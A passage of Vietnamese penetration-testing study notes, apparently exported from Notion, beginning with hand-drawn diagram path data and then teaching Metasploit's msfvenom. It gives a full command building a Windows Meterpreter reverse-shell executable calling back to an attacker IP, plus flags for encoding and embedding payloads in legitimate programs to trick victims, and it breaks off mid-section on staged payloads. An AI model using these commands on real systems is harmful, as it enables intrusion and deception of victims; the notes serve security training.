9632.13 L425.45 9632.26 L426.64 9632.13 L427.88 9632.26 L429.07 9632.26 L430.31 9632.26 L431.79 9632.26 L432.98 9632.26 L434.16 9632.26 L435.47 9632.26 L436.65 9632.26 L437.78 9632.13 L438.96 9632.26 L440.51 9632.26 L441.69 9632.26 L442.88 9632.26 L444.06 9632.13 L445.36 9632.13 L446.67 9632.06 L448.03 9632.06 L449.39 9632.06 L450.76 9632.06 L452.12 9632.06 L453.54 9631.99 L454.96 9631.99 L456.51 9631.93 L458.88 9631.93 L460.71 9631.73 L462.25 9631.66 L463.50 9631.60 L464.62 9631.53 L466.05 9631.47 L467.35 9631.33 L468.53 9631.20 L469.72 9631.07 L470.96 9630.94 L472.21 9630.81 L473.45 9630.67 L474.64 9630.47 L475.82 9630.35 L477.07 9630.15 L478.31 9630.08 L479.50 9629.95 L480.80 9629.82 L482.05 9629.75 L483.35 9629.69 L484.59 9629.69 L485.90 9629.62 L487.26 9629.62 L488.56 9629.55 L489.93 9629.55 L491.29 9629.42 L492.65 9629.42 L493.90 9629.35 L495.26 9629.35 L496.62 9629.35 L498.05 9629.22 L499.53 9629.16 L500.77 9629.16 L502.67 9628.96 L504.39 9628.83 L505.63 9628.63 L507.17 9628.50 L508.42 9628.43 L509.78 9628.23 L510.96 9628.17 L512.15 9628.03 L513.45 9627.97 L514.70 9627.84 L516.00 9627.77 L517.19 9627.77 L518.43 9627.77 L519.79 9627.70 L521.16 9627.50 L523.41 9627.31 L524.83 9627.24 L526.19 9627.05 L527.32 9626.98 L528.33 9626.85 L529.75 9626.65 L530.88 9626.58 L531.94 9626.45 L533.25 9626.25 L534.31 9626.12 L535.44 9625.92 L536.45 9625.72 L537.57 9625.46 L538.76 9625.26 L539.88 9624.93 L541.01 9624.60 L542.13 9624.20 L544.45 9623.42 L545.81 9622.75 L546.99 9622.23 L547.94 9621.57 L548.83 9621.04 L549.60 9620.45 L550.31 9619.92 L551.14 9619.12 L551.73 9618.40 L552.33 9617.47 L552.62 9616.49 L552.68 9615.36 L552.56 9614.11 L552.33 9612.59 L551.68 9610.28 L551.44 9609.16 L550.61 9606.98 L549.78 9605.07 L548.36 9602.56 L547.23 9601.04 L546.05 9599.65 L544.68 9598.33 L543.20 9597.21 L541.48 9596.16 L540.59 9595.63 L538.76 9594.64 L536.86 9593.78 L534.85 9592.99 L532.89 9592.26 L530.99 9591.60 L529.04 9590.94 L527.44 9590.41 L526.02 9589.95 L524.77 9589.56 L523.65 9589.23 L522.52 9589.03 L519.97 9588.50 L519.02 9588.30 L517.25 9587.97 L515.76 9587.84 L513.22 9587.51 L512.03 9587.45 L510.91 9587.31 L509.31 9587.25 L507.76 9587.25 L504.62 9587.25 L503.32 9587.31 L501.19 9587.31 L499.41 9587.45 L497.81 9587.51 L496.45 9587.51 L495.26 9587.51 L493.78 9587.57 L492.42 9587.51 L491.23 9587.51 L489.93 9587.45 L488.74 9587.31 L487.50 9587.25 L486.19 9587.18 L484.77 9587.11 L482.64 9586.98 L480.33 9586.92 L478.49 9586.98 L476.89 9586.92 L475.53 9586.92 L474.16 9586.98 L472.45 9586.98 L471.32 9587.11 L468.65 9587.31 L466.22 9587.51 L462.96 9587.71 L461.84 9587.84 L459.82 9587.90 L457.75 9588.10 L456.62 9588.23 L454.73 9588.37 L453.01 9588.50 L451.53 9588.63 L450.22 9588.76 L449.10 9588.83 L447.68 9589.03 L446.55 9589.09 L445.42 9589.16 L444.36 9589.29 L443.11 9589.49 L441.10 9589.69 L438.49 9589.89 L437.19 9589.95 L434.82 9590.15 L433.16 9590.28 L431.73 9590.35 L430.61 9590.41 L429.54 9590.61 L428.30 9590.68 L427.11 9590.75 L427.11 9590.75" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M556.83 9700.24 L556.24 9700.77 L555.76 9701.49 L555.35 9702.35 L554.93 9703.15 L554.64 9704.20 L554.40 9705.26 L554.40 9706.57 L554.70 9707.63 L555.11 9708.49 L555.65 9709.48 L556.12 9710.20 L556.71 9710.80 L557.42 9711.53 L558.13 9712.25 L558.85 9712.98 L559.62 9713.70 L560.45 9714.43 L561.22 9715.02 L562.11 9715.68 L563.41 9716.47 L564.83 9717.27 L566.08 9717.93 L567.20 9718.39 L568.27 9718.79 L569.22 9719.12 L570.16 9719.32 L571.53 9719.65 L572.59 9719.91 L573.90 9720.04 L575.14 9720.24 L576.51 9720.37 L577.99 9720.44 L579.76 9720.63 L581.84 9720.70 L583.62 9720.70 L586.64 9720.77 L588.06 9720.83 L591.44 9720.90 L592.62 9721.03 L594.76 9721.03 L598.19 9721.10 L600.27 9721.10 L602.11 9721.10 L604.83 9721.03 L607.02 9721.03 L612.12 9720.70 L614.79 9720.50 L617.45 9720.30 L620.12 9720.10 L622.79 9719.91 L625.51 9719.84 L628.24 9719.58 L630.85 9719.51 L632.15 9719.45 L634.76 9719.25 L637.36 9719.18 L640.03 9719.12 L644.12 9718.79 L646.96 9718.59 L649.81 9718.39 L652.59 9718.19 L655.44 9717.93 L656.80 9717.80 L659.71 9717.60 L662.49 9717.33 L665.16 9717.20 L667.82 9717.00 L671.62 9716.87 L673.81 9716.87 L675.59 9716.87 L678.25 9716.94 L679.38 9717.00 L681.33 9717.20 L683.11 9717.27 L685.19 9717.40 L686.31 9717.53 L688.27 9717.66 L691.41 9717.93 L692.48 9717.99 L696.09 9718.06 L698.58 9718.13 L701.01 9718.19 L703.68 9718.32 L706.11 9718.46 L708.65 9718.52 L711.20 9718.79 L713.93 9718.85 L716.65 9719.05 L719.44 9719.18 L722.22 9719.25 L723.59 9719.32 L728.03 9719.32 L731.05 9719.25 L734.02 9719.18 L736.92 9719.12 L739.94 9719.05 L742.85 9718.92 L745.81 9718.85 L748.83 9718.79 L750.43 9718.59 L753.69 9718.32 L757.01 9718.06 L760.86 9717.66 L766.25 9717.27 L769.99 9717.00 L773.60 9716.94 L777.16 9716.87 L780.59 9717.00 L782.37 9717.14 L785.69 9717.27 L789.01 9717.60 L792.39 9717.80 L795.71 9718.13 L799.08 9718.32 L802.40 9718.52 L807.44 9718.72 L810.70 9718.79 L812.30 9718.85 L815.32 9719.05 L818.28 9719.25 L821.07 9719.45 L823.73 9719.65 L826.40 9719.91 L829.01 9720.10 L831.56 9720.44 L834.11 9720.70 L835.41 9720.83 L839.32 9721.36 L841.99 9721.56 L844.65 9721.82 L847.26 9722.02 L849.81 9722.35 L852.36 9722.75 L854.85 9723.14 L857.22 9723.47 L859.47 9723.87 L860.65 9724.07 L861.66 9724.20 L863.50 9724.46 L865.69 9724.73 L869.48 9725.25 L871.50 9725.45 L873.93 9725.78 L876.00 9726.05 L878.25 9726.25 L879.44 9726.37 L881.99 9726.57 L884.53 9726.84 L887.02 9726.97 L889.57 9727.23 L893.36 9727.43 L895.79 9727.63 L898.16 9727.76 L900.18 9727.83 L901.96 9727.83 L903.56 9727.96 L906.82 9728.03 L908.89 9728.03 L911.20 9727.96 L912.45 9727.96 L916.06 9727.70 L920.09 9727.23 L921.39 9726.97 L923.94 9726.57 L926.67 9726.05 L929.28 9725.39 L931.82 9724.66 L934.49 9723.93 L936.86 9723.21 L939.17 9722.55 L941.48 9721.76 L942.55 9721.36 L944.68 9720.44 L947.71 9719.18 L949.54 9718.19 L950.96 9717.53 L952.15 9716.87 L953.10 9716.35 L953.99 9715.68 L954.70 9715.22 L955.35 9714.63 L956.24 9713.90 L957.01 9713.31 L957.84 9712.58 L958.61 9711.92 L959.26 9711.33 L959.91 9710.47 L960.45 9709.68 L960.92 9708.75 L961.33 9707.76 L961.75 9706.71 L961.99 9705.59 L962.05 9704.40 L961.81 9703.08 L961.22 9701.03 L960.21 9699.05 L959.02 9697.20 L957.66 9695.36 L956.06 9693.64 L954.22 9691.92 L952.27 9690.27 L951.20 9689.61 L947.65 9687.57 L944.98 9686.38 L942.13 9685.32 L938.64 9684.20 L935.02 9683.34 L931.47 9682.49 L927.85 9681.63 L924.12 9680.77 L922.52 9680.37 L919.20 9679.78 L915.82 9679.19 L910.73 9678.53 L907.29 9678.06 L903.91 9677.86 L900.48 9677.53 L897.10 9677.27 L893.84 9677.14 L892.18 9677.01 L888.98 9676.81 L885.90 9676.68 L882.76 9676.41 L879.68 9676.28 L874.88 9675.95 L871.56 9675.82 L868.12 9675.69 L864.45 9675.62 L862.55 9675.62 L858.82 9675.62 L855.08 9675.62 L851.35 9675.82 L847.20 9676.02 L843.17 9676.28 L839.08 9676.68 L834.82 9677.14 L830.55 9677.67 L826.34 9678.26 L822.02 9678.72 L817.87 9679.32 L813.90 9679.91 L810.22 9680.50 L806.67 9681.03 L803.05 9681.63 L799.62 9682.09 L795.82 9682.68 L791.85 9683.41 L789.78 9683.74 L777.28 9685.59 L775.08 9685.92 L770.88 9686.45 L766.67 9686.91 L762.58 9687.30 L758.55 9687.70 L754.64 9688.03 L752.80 9688.23 L749.13 9688.56 L745.33 9688.82 L741.42 9689.15 L737.63 9689.35 L732.00 9689.75 L728.27 9690.01 L724.77 9690.27 L721.16 9690.54 L719.44 9690.67 L715.94 9690.93 L712.56 9691.13 L709.25 9691.40 L705.99 9691.66 L702.85 9691.79 L699.88 9691.86 L697.10 9691.79 L693.96 9691.66 L692.36 9691.53 L690.88 9691.40 L689.81 9691.26 L688.33 9691.00 L687.14 9690.67 L686.13 9690.27 L684.59 9689.61 L681.99 9688.29 L680.15 9687.43 L678.67 9686.64 L677.31 9685.98 L676.00 9685.39 L674.16 9684.73 L672.21 9683.94 L670.13 9683.21 L669.01 9682.82 L666.88 9682.09 L664.68 9681.36 L662.37 9680.57 L660.06 9679.98 L656.56 9679.19 L654.19 9678.92 L651.82 9678.66 L649.75 9678.59 L647.91 9678.53 L644.42 9678.53 L641.57 9678.59 L638.79 9678.72 L636.00 9678.99 L633.33 9679.12 L629.25 9679.52 L626.52 9679.71 L623.85 9679.98 L622.49 9680.17 L619.88 9680.50 L617.22 9680.77 L614.61 9681.10 L611.94 9681.50 L609.33 9681.89 L606.73 9682.49 L604.06 9683.01 L601.51 9683.61 L599.14 9684.07 L597.07 9684.53 L595.41 9684.99 L594.11 9685.32 L592.92 9685.72 L591.97 9686.05 L590.73 9686.45 L589.66 9686.84 L588.71 9687.24 L587.76 9687.57 L586.88 9687.96 L585.93 9688.36 L584.98 9688.82 L583.91 9689.22 L582.91 9689.81 L580.30 9691.00 L578.76 9691.73 L577.45 9692.32 L576.27 9692.85 L575.14 9693.25 L574.13 9693.64 L573.19 9694.03 L572.30 9694.37 L570.40 9695.16 L568.80 9695.62 L566.73 9696.35 L564.71 9697.07 L562.76 9697.60 L561.69 9697.93 L558.67 9698.79 L557.31 9699.18 L556.24 9699.51 L555.11 9699.85 L554.22 9700.17 L553.04 9700.57 L552.09 9700.97 L551.20 9701.36 L550.49 9701.82 L550.49 9701.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1077.19 9642.09 L1076.00 9641.96 L1075.41 9641.37 L1074.82 9640.37 L1074.52 9638.46 L1074.16 9636.09 L1073.93 9631.99 L1074.05 9629.22 L1074.28 9626.58 L1074.76 9624.20 L1075.29 9621.96 L1076.18 9619.92 L1077.19 9618.00 L1077.78 9617.08 L1079.02 9615.43 L1080.39 9613.91 L1081.69 9612.66 L1082.82 9611.80 L1083.82 9611.20 L1084.71 9610.87 L1085.96 9610.74 L1087.20 9611.00 L1088.27 9611.53 L1089.75 9612.59 L1091.17 9613.85 L1092.42 9615.10 L1093.54 9616.49 L1094.61 9618.00 L1095.62 9619.72 L1096.51 9621.57 L1097.22 9623.55 L1097.75 9625.53 L1098.22 9627.77 L1098.64 9629.95 L1098.93 9632.13 L1099.11 9634.04 L1099.11 9635.69 L1099.11 9637.14 L1098.88 9639.06 L1098.70 9640.11 L1098.40 9641.96 L1097.69 9644.47 L1097.04 9646.38 L1096.62 9647.17 L1096.03 9648.49 L1095.32 9649.62 L1094.67 9650.54 L1094.02 9651.27 L1093.31 9651.93 L1092.18 9652.46 L1091.05 9652.79 L1089.87 9652.72 L1088.68 9652.19 L1086.85 9651.20 L1085.36 9649.75 L1084.71 9648.89 L1083.41 9646.97 L1082.40 9644.86 L1081.45 9642.82 L1080.51 9640.71 L1079.68 9638.66 L1078.96 9636.68 L1078.55 9635.82 L1078.08 9634.37 L1077.60 9633.18 L1077.31 9632.13 L1077.07 9631.14 L1076.95 9629.75 L1077.13 9628.50 L1077.54 9627.37 L1078.02 9626.45 L1078.73 9625.72 L1078.73 9625.72" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1075.71 9649.75 L1076.12 9648.69 L1076.48 9647.90 L1076.89 9646.97 L1077.31 9646.12 L1077.78 9645.39 L1078.43 9644.67 L1079.14 9644.07 L1079.91 9643.55 L1080.74 9643.15 L1080.15 9644.07 L1078.73 9646.25 L1077.48 9648.30 L1075.47 9651.99 L1074.16 9654.50 L1072.92 9657.14 L1071.85 9659.91 L1071.32 9661.30 L1070.37 9664.00 L1069.42 9666.65 L1068.59 9669.15 L1067.88 9671.73 L1067.23 9674.10 L1066.64 9676.41 L1065.99 9678.99 L1065.69 9680.24 L1065.45 9681.30 L1065.10 9682.49 L1064.86 9683.41 L1064.62 9684.53 L1064.68 9685.72 L1065.75 9685.92 L1066.76 9685.72 L1069.66 9685.26 L1072.03 9684.86 L1073.33 9684.60 L1075.88 9684.13 L1078.43 9683.67 L1080.86 9683.28 L1084.48 9682.88 L1085.48 9682.68 L1087.44 9682.55 L1089.10 9682.49 L1090.52 9682.49 L1091.76 9682.49 L1093.01 9682.42 L1094.19 9682.29 L1097.87 9682.02 L1100.06 9681.63 L1101.72 9681.36 L1103.20 9681.23 L1104.21 9681.03 L1105.51 9680.97 L1106.76 9680.77 L1107.94 9680.77 L1108.83 9680.50 L1109.42 9679.71 L1109.42 9678.53 L1109.31 9677.01 L1109.01 9674.43 L1108.53 9671.46 L1108.30 9670.08 L1107.65 9667.04 L1106.94 9664.14 L1105.99 9660.24 L1105.33 9657.93 L1104.68 9655.76 L1104.39 9654.83 L1103.91 9653.25 L1103.44 9651.99 L1103.02 9650.87 L1102.79 9649.88 L1102.31 9648.69 L1102.08 9647.77 L1102.08 9647.77" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="1320.00" y="9596.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="1320.00" dy="0">session 1</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="1320.00" y="9656.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="1320.00" dy="0">session 2</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="1320.00" y="9716.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="1320.00" dy="0">session 3</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="1020.00" y="9716.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="1020.00" dy="0">exploit/multi/handler</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M919.68 9735.55 L918.73 9735.82 L918.85 9738.26 L919.44 9743.07 L919.97 9747.10 L920.33 9749.28 L921.81 9756.60 L923.41 9761.75 L925.25 9766.90 L927.50 9771.98 L930.11 9776.93 L933.07 9781.62 L936.21 9786.04 L939.59 9790.20 L941.42 9792.18 L945.10 9796.01 L948.89 9799.44 L952.86 9802.61 L958.91 9806.83 L963.05 9809.14 L966.96 9810.92 L970.88 9812.25 L974.73 9813.43 L976.62 9813.83 L980.06 9814.49 L983.38 9814.55 L986.64 9814.42 L990.08 9813.63 L993.93 9812.25 L997.72 9810.40 L1004.36 9806.70 L1008.80 9803.99 L1010.93 9802.54 L1015.26 9799.70 L1019.47 9796.73 L1023.62 9793.76 L1027.41 9790.86 L1031.20 9787.76 L1034.82 9784.46 L1038.43 9781.22 L1042.16 9777.79 L1044.06 9776.27 L1049.28 9771.92 L1052.30 9769.47 L1054.96 9767.43 L1057.28 9765.58 L1059.35 9764.06 L1061.19 9762.74 L1062.79 9761.56 L1063.50 9760.96 L1064.62 9760.17 L1065.51 9759.44 L1066.22 9758.92 L1067.11 9758.26 L1067.82 9757.79 L1068.59 9757.13 L1068.59 9757.13" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1058.05 9750.20 L1057.39 9749.61 L1056.92 9748.55 L1057.16 9747.50 L1058.34 9746.31 L1060.12 9745.32 L1062.25 9744.53 L1063.38 9744.26 L1065.75 9744.00 L1068.06 9744.33 L1071.32 9745.45 L1073.16 9746.84 L1074.40 9748.55 L1075.23 9750.60 L1075.47 9752.84 L1075.23 9755.62 L1074.99 9757.07 L1074.11 9760.43 L1072.68 9763.86 L1071.73 9765.52 L1071.73 9765.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="960.00" y="9836.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="960.00" dy="0">chạy ngầm</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1294.85 9587.64 L1294.37 9586.92 L1293.31 9586.39 L1292.06 9585.79 L1289.75 9585.00 L1287.02 9584.15 L1283.65 9583.22 L1279.68 9582.16 L1275.41 9581.30 L1270.61 9580.58 L1265.69 9580.12 L1260.59 9579.85 L1255.38 9579.92 L1250.16 9580.32 L1244.65 9580.97 L1239.38 9581.77 L1234.52 9582.56 L1229.60 9583.75 L1227.35 9584.41 L1222.67 9585.79 L1218.28 9587.45 L1214.08 9589.29 L1208.15 9592.33 L1204.59 9594.31 L1201.10 9596.35 L1197.90 9598.33 L1196.36 9599.19 L1193.69 9600.84 L1191.38 9602.29 L1189.19 9603.75 L1187.23 9604.93 L1185.51 9605.99 L1184.45 9606.65 L1183.38 9607.25 L1182.61 9607.77 L1181.66 9608.43 L1180.77 9609.09 L1179.88 9609.75 L1178.52 9610.87 L1177.87 9611.53 L1176.56 9612.72 L1175.50 9613.78 L1174.55 9614.64 L1173.78 9615.43 L1173.01 9616.15 L1172.30 9616.68 L1171.76 9617.34 L1171.05 9618.07 L1170.34 9618.73 L1169.63 9619.39 L1168.98 9620.12 L1168.98 9620.12" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1172.30 9609.16 L1171.35 9609.49 L1170.16 9610.28 L1168.51 9611.86 L1166.13 9614.97 L1164.65 9617.34 L1163.94 9618.53 L1162.82 9621.04 L1161.87 9623.42 L1161.10 9625.72 L1160.86 9626.65 L1160.45 9628.17 L1160.21 9629.35 L1160.21 9630.74 L1160.62 9631.73 L1161.63 9632.13 L1163.47 9632.26 L1166.49 9631.86 L1170.40 9631.14 L1174.61 9630.15 L1176.86 9629.75 L1181.31 9628.89 L1181.31 9628.89" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1292.12 9650.08 L1290.52 9649.82 L1286.73 9649.09 L1282.46 9648.43 L1277.78 9647.70 L1272.45 9646.91 L1266.40 9646.19 L1263.26 9645.79 L1256.56 9645.19 L1249.75 9644.73 L1242.76 9644.34 L1235.71 9644.20 L1228.71 9644.34 L1219.05 9644.80 L1216.03 9645.06 L1210.82 9645.52 L1205.84 9646.19 L1201.22 9646.78 L1196.95 9647.44 L1192.92 9648.16 L1189.78 9648.69 L1186.82 9649.29 L1185.45 9649.49 L1182.91 9650.08 L1181.78 9650.28 L1178.64 9650.80 L1177.28 9651.00 L1176.09 9651.20 L1176.09 9651.20" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1190.55 9633.84 L1187.23 9634.37 L1184.56 9635.23 L1181.96 9636.35 L1179.59 9637.80 L1177.33 9639.45 L1176.39 9640.37 L1174.55 9642.36 L1172.48 9645.59 L1171.35 9647.83 L1170.64 9650.21 L1170.46 9651.27 L1170.40 9653.12 L1170.46 9654.76 L1171.23 9657.01 L1172.30 9659.12 L1174.02 9661.30 L1176.45 9663.48 L1179.65 9665.46 L1183.50 9667.37 L1188.65 9669.09 L1188.65 9669.09" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1305.10 9723.93 L1301.90 9723.60 L1300.00 9723.34 L1295.85 9722.15 L1290.82 9720.44 L1282.46 9717.33 L1279.20 9716.02 L1272.45 9713.31 L1265.69 9710.27 L1258.76 9707.17 L1251.94 9703.80 L1245.36 9700.30 L1238.91 9696.94 L1235.88 9695.29 L1229.90 9691.92 L1222.31 9687.96 L1217.57 9685.52 L1213.42 9683.61 L1209.75 9681.83 L1206.43 9680.31 L1204.71 9679.71 L1202.11 9678.59 L1199.62 9677.47 L1197.48 9676.61 L1195.65 9675.82 L1194.28 9675.23 L1193.33 9674.76 L1192.45 9674.37 L1191.62 9673.97 L1190.73 9673.51 L1189.90 9673.05 L1189.90 9673.05" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1190.67 9685.26 L1189.84 9684.80 L1189.36 9683.80 L1189.07 9682.49 L1188.83 9681.50 L1188.59 9679.32 L1188.36 9677.47 L1188.24 9675.89 L1188.24 9674.56 L1188.48 9673.51 L1188.95 9672.52 L1190.25 9671.00 L1192.15 9669.95 L1194.28 9669.42 L1196.48 9669.35 L1198.91 9669.68 L1201.57 9670.14 L1203.94 9670.87 L1206.31 9671.73 L1208.62 9672.65 L1209.75 9673.25 L1212.24 9674.37 L1215.02 9675.29 L1217.99 9676.02 L1217.99 9676.02" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="1080.00" y="9756.00" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="1080.00" dy="0">quản lý nhiều</tspan><tspan x="1080.00" dy="20">handler cho nhiều</tspan><tspan x="1080.00" dy="20">session</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M399.66 9039.84 C498.38 9041.25,595.17 9039.40,720.26 9039.53 M400.38 9040.44 C492.63 9038.81,585.16 9038.84,719.55 9039.55 M719.62 9038.75 C719.13 9048.61,719.77 9057.44,719.94 9081.25 M719.92 9040.46 C720.45 9050.34,719.74 9059.20,720.84 9079.47 M720.71 9079.27 C593.91 9078.71,465.81 9078.75,401.02 9080.23 M720.54 9079.79 C634.65 9082.06,548.58 9081.30,399.75 9080.22 M398.46 9078.98 C399.24 9069.62,399.87 9060.44,401.88 9039.38 M400.33 9079.45 C398.83 9067.41,399.88 9056.15,400.39 9040.17" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
</svg>
    </div>
  </div>
</div>


---

## 📖 Nội dung chi tiết bài viết (Writeup)

<div id="doc-8f4d62f5ba431cc32be05afdd778350283e33068" class="notion-callout-card">

Phần này dạy mày về **msfvenom** – công cụ tạo payload độc lập, dùng khi không có sẵn exploit module để phóng payload tự động.

### 📘 msfvenom là gì?
- Là **công cụ command-line** của Metasploit, chạy ngoài `msfconsole`.
- Dùng để **tạo ra các file payload** (`.exe`, `.elf`, `.apk`, web shell, shellcode...) để tự đem đi gài vào mục tiêu bằng cách khác: upload, gửi email, USB, SSH...

### 🧪 Khi nào cần msfvenom?
- Có lỗi upload web nhưng không có module exploit tương ứng → tạo web shell (PHP, ASP, JSP) để upload.
- Có SSH nhưng muốn nâng cấp lên Meterpreter → tạo file payload rồi chạy trên máy đó.
- Cần chèn payload vào file thực thi hợp pháp để lừa nạn nhân (phishing).

### 🔁 Quy trình dùng msfvenom:
1. **Tạo payload** – chỉ định OS, loại payload, định dạng file, LHOST/LPORT.
2. **Chuyển payload lên mục tiêu** – bằng mọi cách (upload, email, USB...).
3. **Mở listener** trong `msfconsole` bằng module `exploit/multi/handler` để chờ kết nối ngược.
4. **Thực thi payload** trên mục tiêu.
5. **Nhận session** và tương tác.

### 📌 Lịch sử:
- Trước đây có hai tool riêng: `msfpayload` (tạo payload) và `msfencode` (mã hóa). Năm 2015 gộp lại thành `msfvenom`.

➡️ **Tóm gọn:** msfvenom giúp mày **tự tạo file payload** để gài vào mục tiêu khi không dùng được module exploit có sẵn. Mày phải tự lo phần giao hàng (delivery), còn lại vẫn dùng Metasploit để bắt session.

</div>

---

<div id="doc-4c22e97d17140284bf9c44b382af88c1fc2f3cb9" class="notion-callout-card">

Ok mày, tao sẽ dạy lại phần này cho dễ hiểu, đi từng bước như đang nói chuyện.

### 📘 Cấu trúc lệnh msfvenom cơ bản

Lệnh msfvenom luôn có dạng:

```
msfvenom -p <payload> LHOST=<IP_của_mày> LPORT=<cổng> -f <định_dạng> -o <tên_file>
```

Trong đó:
- `-p` : chọn payload (loại mã độc sẽ chạy trên máy nạn nhân).
- `LHOST=` : IP máy mày (máy tấn công) để nạn nhân gọi về.
- `LPORT=` : cổng mày mở để nhận kết nối ngược.
- `-f` : định dạng file xuất ra (exe, elf, raw, python...).
- `-o` : tên file lưu payload.

**Ví dụ tạo file `shell.exe` chạy trên Windows:**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f exe -o shell.exe
```

Giải thích nhanh:
- Payload: `windows/x64/meterpreter/reverse_tcp` (Meterpreter trên Windows 64-bit, kết nối ngược).
- IP máy tấn công: `10.10.14.12`, cổng `4444`.
- Xuất ra file `exe` tên `shell.exe`.

### 📘 Các flag quan trọng

| Flag | Ý nghĩa | Ví dụ |
|------|---------|-------|
| `-p` | Chọn payload | `-p linux/x64/meterpreter/reverse_tcp` |
| `-f` | Định dạng output | `-f exe`, `-f elf`, `-f python` |
| `-o` | Ghi ra file | `-o shell.exe` |
| `-e` | Chọn encoder | `-e x86/shikata_ga_nai` |
| `-i` | Số lần encode | `-i 5` |
| `-b` | Ký tự cần tránh | `-b '\x00\x0a\x0d'` |
| `-x` | File mẫu để chèn payload vào | `-x putty.exe` |
| `-k` | Giữ nguyên chức năng file mẫu (dùng với `-x`) | `-k` |
| `-a` | Chỉ định kiến trúc | `-a x64` |
| `--platform` | Chỉ định nền tảng | `--platform windows` |
| `-n` | Thêm NOP sled N bytes phía trước | `-n 16` |

> Lưu ý: `LHOST` và `LPORT` không phải flag, chúng là **payload options**. Mày truyền thẳng sau `-p` dạng `KEY=VALUE`.

### 📘 Liệt kê những thứ có sẵn

Muốn xem danh sách payload, format, encoder, platform, architecture:

- Xem tất cả payload:
  ```bash
  msfvenom -l payloads
  ```
- Lọc nhanh bằng `grep`:
  ```bash
  msfvenom -l payloads | grep linux | grep meterpreter
  ```

- Xem các định dạng output:
  ```bash
  msfvenom -l formats
  ```
  Gồm:
  - **Executable formats**: `exe`, `elf`, `dll`, `msi`, `apk`, `war`...
  - **Transform formats**: `python`, `powershell`, `c`, `raw`, `base64`, `hex`... (dạng mã nguồn hoặc shellcode để nhúng vào tool khác).

- Xem encoders:
  ```bash
  msfvenom -l encoders
  ```

- Xem platforms và architectures:
  ```bash
  msfvenom -l platforms
  msfvenom -l archs
  ```

### 📘 Kiểm tra options của payload

Muốn biết payload cần những gì (LHOST, LPORT, EXITFUNC...) thì chạy:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

Kết quả sẽ hiện tương tự `show options` trong msfconsole, cho biết tham số nào bắt buộc, tham số nào có giá trị mặc định.

Ví dụ:
```
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique
LHOST                      yes       The listen address
LPORT     4444             yes       The listen port
```

### Tóm gọn lại:
- Dùng `msfvenom -p <payload> LHOST=<IP> LPORT=<port> -f <format> -o <file>`.
- `-l` để liệt kê payload/formats/encoders...
- `--list-options` để xem yêu cầu của payload.
- Đây là bước tạo file payload thủ công, để tự đem gài vào mục tiêu.

Hiểu rồi chứ ông bạn? 😎

</div>

---

<div id="doc-372cf8eb14c0d0e9596d0d99fd636fe2e63f0130" class="notion-callout-card">

Ok mày, tao giải thích ngắn gọn về **staged vs stageless** payload nhé.

### 📘 Cơ chế:
- **Stageless (inline)**:  
  - Toàn bộ payload (Meterpreter/shell) nằm trong một file.  
  - Khi chạy, nó kết nối thẳng về máy mày → xong.  
  - **Ưu**: đáng tin cậy, không cần tải thêm.  
  - **Nhược**: file to hơn.

- **Staged**:  
  - Gồm 2 phần: **stager** (nhỏ) và **stage** (to).  
  - Stager chạy trước, kết nối về handler, sau đó **tải stage** từ handler về rồi mới thực thi.  
  - **Ưu**: file nhỏ, dễ chui qua nơi giới hạn kích thước.  
  - **Nhược**: cần handler luôn bật để serve stage, nếu rớt mạng giữa chừng là fail.

### 🔎 Phân biệt qua tên:
